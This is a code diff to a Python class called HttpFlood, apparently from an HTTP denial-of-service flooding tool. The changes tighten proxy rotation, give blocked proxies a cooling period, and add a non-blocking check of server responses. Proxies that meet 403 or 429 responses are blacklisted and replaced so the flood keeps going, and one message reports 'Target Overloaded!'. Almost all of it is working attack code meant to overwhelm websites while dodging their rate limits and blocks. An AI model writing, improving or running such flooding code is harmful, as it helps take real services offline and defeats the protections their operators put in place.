@@ -1121,37 +1121,55 @@ class HttpFlood(Thread):
         proxy = None
         if self._proxies:
             # [PHASE 13] Dynamic Random Selection for Live Synchronization
-            # random.choice on the shared list ensures recycled proxies are used immediately
-            for _ in range(20): # Try 20 times to find a non-burned proxy
+            for _ in range(20): 
                 p = randchoice(self._proxies)
+                p_str = str(p) # [FIX] Use str(p) instead of p.proxy
                 
                 # Check if proxy is in Cooling Period
-                burn_time = BURNED_PROXIES.get(p.proxy)
+                burn_time = BURNED_PROXIES.get(p_str)
                 if burn_time:
                     if time() - burn_time > COOLING_PERIOD:
-                        # Cooling period expired
                         with suppress(KeyError):
-                            del BURNED_PROXIES[p.proxy]
+                            del BURNED_PROXIES[p_str]
                     else:
-                        continue # Skip burned
+                        continue 
                 
-                self._current_proxy = p.proxy
+                self._current_proxy = p_str
                 proxy = p
                 break
             
-            # [PHASE 13] Trigger auto-recycle if healthy pool is low
-            # Trigger if >80% are burned
             if len(BURNED_PROXIES) > len(self._proxies) * 0.8:
                 global RECYCLE_EVENT, IS_RECYCLING
                 if not IS_RECYCLING:
                     RECYCLE_EVENT.set()
             
-            # If still no proxy (Pool exhausted), wait and retry or use current
             if not proxy:
                 RECYCLE_EVENT.set()
                 sleep(2)
                 proxy = randchoice(self._proxies)
-                self._current_proxy = proxy.proxy
+                self._current_proxy = str(proxy)
+        
+        sock = None
+        try:
+            if proxy:
+                sock = proxy.open_socket(AF_INET, SOCK_STREAM)
+            else:
+                sock = socket(AF_INET, SOCK_STREAM)
+
+            sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+            sock.settimeout(5)
+            
+            sock.connect(host or self._raw_target)
+            
+            if self._target.scheme == "https":
+                sock = ctx.wrap_socket(sock, server_hostname=self._target.host)
+            
+            return sock
+        except Exception as e:
+            # [NEW] Connection Debugging
+            # if logger.level <= 10: logger.debug(f"Connection Failed: {e}")
+            Tools.safe_close(sock)
+            return None
 
         sock = None
         if proxy:
@@ -1476,17 +1494,22 @@ class HttpFlood(Thread):
                     REQUESTS_SENT += 1
                     BYTES_SEND += len(payload)
                     # [NEW] Status Tracker (Sniffer) + Auto Reconnect + Blacklist
+                    # [PHASE 13] Smarter Sniffer (Non-Blocking)
                     try:
+                        s.setblocking(False)
                         response_start = s.recv(20).decode('utf-8', errors='ignore')
-                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
+                        s.setblocking(True)
+                        if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                             status_code = response_start.split(" ")[1]
-                            print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] DYN: Server Response")
                             if status_code in {"403", "429"}:
-                                if hasattr(self, '_current_proxy'):
-                                    BURNED_PROXIES[self._current_proxy] = time()
+                                BURNED_PROXIES[self._current_proxy] = time()
                                 raise Exception("Proxy Blocked")
+                    except (BlockingIOError, ssl.SSLWantReadError):
+                        s.setblocking(True)
+                        pass
                     except Exception as e:
                         if "Blocked" in str(e): raise e
+                        s.setblocking(True)
                         pass
         except Exception as e:
             pass
@@ -1524,20 +1547,22 @@ class HttpFlood(Thread):
                     REQUESTS_SENT += 1
                     BYTES_SEND += len(payload)
                     # Status Sniffer
+                    # [PHASE 13] Smarter Sniffer (Non-Blocking)
                     try:
+                        s.setblocking(False)
                         response_start = s.recv(20).decode('utf-8', errors='ignore')
-                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
+                        s.setblocking(True)
+                        if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                             status_code = response_start.split(" ")[1]
-                            print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] POST_DYN: Response")
                             if status_code in {"403", "429"}:
-                                # [PHASE 11] Temporary Blacklist Proxy
-                                try:
-                                    if hasattr(self, '_current_proxy'):
-                                        BURNED_PROXIES[self._current_proxy] = time()
-                                except: pass
+                                BURNED_PROXIES[self._current_proxy] = time()
                                 raise Exception("Proxy Blocked")
+                    except (BlockingIOError, ssl.SSLWantReadError):
+                        s.setblocking(True)
+                        pass
                     except Exception as e:
                         if "Blocked" in str(e): raise e
+                        s.setblocking(True)
                         pass
         except:
             pass
@@ -1597,7 +1622,7 @@ class HttpFlood(Thread):
                         print(f"[{int(CONNECTIONS_SENT)}] [STATUS {resp.status_code}] H2_FLOOD: Target Overloaded!")
                     elif resp.status_code in {403, 429}:
                         if proxy_url:
-                            BURNED_PROXIES[p.proxy] = time()
+                            BURNED_PROXIES[str(p)] = time()
                         raise Exception("Proxy Blocked")
         except Exception:
             # If client fails, close it so it recreates next time
